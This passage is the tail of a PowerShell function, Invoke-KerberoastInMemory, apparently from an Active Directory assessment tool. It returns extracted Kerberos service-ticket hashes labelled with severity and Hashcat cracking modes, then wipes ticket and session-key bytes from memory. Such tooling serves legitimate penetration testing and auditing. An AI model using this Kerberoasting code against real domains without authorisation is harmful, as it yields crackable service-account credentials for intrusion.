            # Cast to [int] for hashtable lookup compatibility (Read-ASN1Integer returns Int64)
            $etypeInfo = $null
            $etypeInt = [int]$tgsResult.EncryptionType
            if ($Script:KERBEROS_ENCRYPTION_TYPES -and $Script:KERBEROS_ENCRYPTION_TYPES.ContainsKey($etypeInt)) {
                $etypeInfo = $Script:KERBEROS_ENCRYPTION_TYPES[$etypeInt]
            }

            if ($hash) {
                Write-Log "[Invoke-KerberoastInMemory] Hash extracted for $SPN (etype $($tgsResult.EncryptionType))"
            } else {
                Write-Log "[Invoke-KerberoastInMemory] Failed to extract hash from ticket for $SPN"
            }

            return [PSCustomObject]@{
                SAMAccountName = $SAMAccountName
                SPN = $SPN
                Success = $true
                EncryptionType = $etypeInt
                EncryptionTypeName = if ($etypeInfo) { $etypeInfo.Name } else { "etype $etypeInt" }
                Severity = if ($etypeInfo) { $etypeInfo.Severity } else { "Unknown" }
                HashcatMode = if ($etypeInfo) { $etypeInfo.HashcatMode } else { $null }
                Hash = $hash
                Error = $null
            }
        } else {
            return [PSCustomObject]@{
                SAMAccountName = $SAMAccountName
                SPN = $SPN
                Success = $false
                EncryptionType = $null
                EncryptionTypeName = $null
                Severity = $null
                HashcatMode = $null
                Hash = $null
                Error = if ($lastError) { $lastError } else { "Unknown error" }
            }
        }
    }
    catch {
        Write-Log "[Invoke-KerberoastInMemory] Error: $_"

        return [PSCustomObject]@{
            SAMAccountName = $SAMAccountName
            SPN = $SPN
            Success = $false
            EncryptionType = $null
            EncryptionTypeName = $null
            Severity = $null
            HashcatMode = $null
            Hash = $null
            Error = $_.Exception.Message
        }
    }
    finally {
        # Clean up sensitive data
        if ($securePassword) {
            try { $securePassword.Dispose() } catch { }
        }

        # Clear TGT and session key from memory
        if ($tgtResult) {
            if ($tgtResult.TicketBytes) {
                [Array]::Clear($tgtResult.TicketBytes, 0, $tgtResult.TicketBytes.Length)
            }
            if ($tgtResult.SessionKeyBytes) {
                [Array]::Clear($tgtResult.SessionKeyBytes, 0, $tgtResult.SessionKeyBytes.Length)
            }
        }

        Write-Log "[Invoke-KerberoastInMemory] Sensitive data cleared from memory"
    }
}
#endregion
